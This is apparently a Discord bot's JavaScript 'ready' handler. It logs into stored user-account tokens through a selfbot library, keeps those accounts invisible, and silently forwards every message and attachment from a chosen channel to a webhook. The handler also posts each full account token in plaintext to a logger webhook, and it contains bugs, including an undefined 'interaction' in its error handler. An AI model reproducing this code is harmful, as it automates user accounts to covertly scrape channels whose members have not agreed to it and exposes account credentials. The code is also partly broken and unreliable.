const config = require('../config.json')
const Discord = require('discord.js')
const logger = new Discord.WebhookClient({ url: config.Logger})
module.exports = {
	name: "ready",
	once: true,
	async execute(client) {
		console.log(`Ready! Logged in as ${client.user.tag}`);
		const selfs = await client.db.get(`names`)
		if (!selfs) {
			await client.db.set('names', [])
			console.log('DataBase Created!')
		}
		await client.user.setPresence({
			activities: [{name: `${selfs.length} Clients | Ping: ${client.ws.ping}`,
			type: Discord.ActivityType.Watching
           }], status: 'idle'
		})
		setInterval(async () => {
			const selfs = await client.db.get(`names`)
		client.user.setPresence({
			activities: [{name: `${selfs.length} Clients | Ping: ${client.ws.ping}`,
			type: Discord.ActivityType.Watching
           }], status: 'idle'
		})
		  }, 30000);
		if (selfs) {
			for (const name of selfs) {
				const token = await client.db.get(`${name}.token`)
				const id = await client.db.get(`${name}.id`)
				const webhook = await client.db.get(`${name}.webhook`)
				try {
					const self = require("discord.js-selfbot-v13")
					const client = new self.Client()
					const web = new self.WebhookClient({ url: webhook });
                    client.on("ready", async() => {
				const e = new Discord.EmbedBuilder()
                .setDescription(`**Client Is Ready**\n\`Name\`: ${name}\n\`Token:\`${token}\n\`Webhook:\`${webhook}\n\`ChannelID:\`${id}`)
                .setTimestamp()
                .setThumbnail('https://images-ext-1.discordapp.net/external/LEXzr_Cze51EZlngdfVpljjDKUzuVKNGTcPKJPAAmCo/https/cdn.discordapp.com/emojis/1089073672062517298.png')
                .setColor('#8df542')
                .setFooter({ text: `${client.user.tag} is now ready`, iconURL: `https://cdn.discordapp.com/avatars/${client.user.id}/${client.user.avatar}.png`})
                await logger.send({ embeds: [e]})
  				setInterval(async () => { 
      				client.user.setStatus('invisible');
          			}, 30000);
                    })
					client.on("messageCreate", async (message, client) => {
                    if(!id) {
                          client.destroy()
                          console.log('destroyed!')
                      }
						if(message.channel.id !== id) return;
						const Attachment = message.attachments;
						setTimeout(function() {
							Attachment.forEach(function(attachment) {
							  web.send({
								content: attachment.url,
								username: message.author.tag,
								avatarURL: "https://cdn.discordapp.com/avatars/"+message.author.id+"/"+message.author.avatar+".jpeg",
							});
							});
							  }, 500);
						if (message.author.bot) 
						{
							web.send({
						  content: message.content || "***NO CONTENT*** | Sticker or something else",
						  username: message.author.tag,
						  embeds: message.embeds,
						  avatarURL: "https://cdn.discordapp.com/avatars/"+message.author.id+"/"+message.author.avatar+".png",
						  
						}) 
					  }
						if (!message.author.bot) {
						web.send({
						  content: message.content || "***NO CONTENT*** | Sticker or something else",
						  username: message.author.tag,
						  avatarURL: "https://cdn.discordapp.com/avatars/"+message.author.id+"/"+message.author.avatar+".png",
						});
						}
						})
					  
				client.login(token)

					} catch(er) {
						const e = new Discord.EmbedBuilder()
						.setDescription(`**Error!**\n\`Name\`: ${name}\n\`Token:\`${token}\n\`Webhook:\`${webhook}\n\`ChannelID:\`${id}`)
						.setTimestamp()
						.setThumbnail('https://images-ext-2.discordapp.net/external/2-D_iyz1JzsLAwqRkb1t8dfQLL64MWw5CySs-7YQf7Y/https/cdn.discordapp.com/emojis/1089073675808018502.png')
						.setColor('#fa0202')
						await logger.send({ embeds: [e]})
						await interaction.client.db.delete(name)
						await interaction.client.db.pull("names", name)
					}
			}
		}
		
	},
};
